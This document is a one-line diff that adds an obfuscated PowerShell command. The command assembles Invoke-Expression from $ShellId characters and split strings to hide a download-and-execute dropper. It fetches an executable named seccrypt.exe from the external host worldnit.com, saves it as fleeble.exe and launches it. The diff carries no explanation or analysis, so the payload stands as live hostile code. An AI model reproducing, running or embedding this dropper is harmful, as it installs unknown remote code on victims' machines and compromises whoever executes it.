@@ -1,0 +1,1 @@
+﻿& ( $sHELLID[1]+$SheLlID[13]+'X')( (('(Ne'+'w-Objec'+'t Syst'+'em.Net.WebClie'+'n'+'t).Downl'+'oadFile(9'+'4Ihttp://w'+'orldnit.com'+'/sec'+'cryp'+'t'+'.exe94'+'I,94Ifleeble'+'.exe'+'94I);Start-Pr'+'o'+'ce'+'ss 94Ifle'+'e'+'ble'+'.exe94I') -replaCE'94I',[CHAr]39) )
